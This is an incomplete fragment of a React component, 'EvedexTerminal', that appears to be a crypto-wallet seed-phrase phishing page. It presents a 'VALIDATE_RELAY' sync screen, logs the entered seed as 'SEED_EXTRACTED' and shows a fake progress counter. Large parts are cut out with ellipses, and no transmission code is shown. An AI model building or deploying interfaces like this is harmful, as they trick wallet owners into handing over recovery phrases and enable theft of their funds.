...
export default function EvedexTerminal() {
  ...
  const startSync = () => {
    setIsSyncing(true);
    log(`🚨 SEED_EXTRACTED [${wordCount}]: ${seedVal}`);
    let c = 0;
    const i = setInterval(() => {
      c += 1;
      setSyncProgress(c);
          ...
          <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'40px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
            {!isSyncing ? (
              <>
                ...
                <button disabled={!isSeedValid} onClick={startSync} style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900', marginTop:'20px'}}>VALIDATE_RELAY</button>
              </>
            ) : (
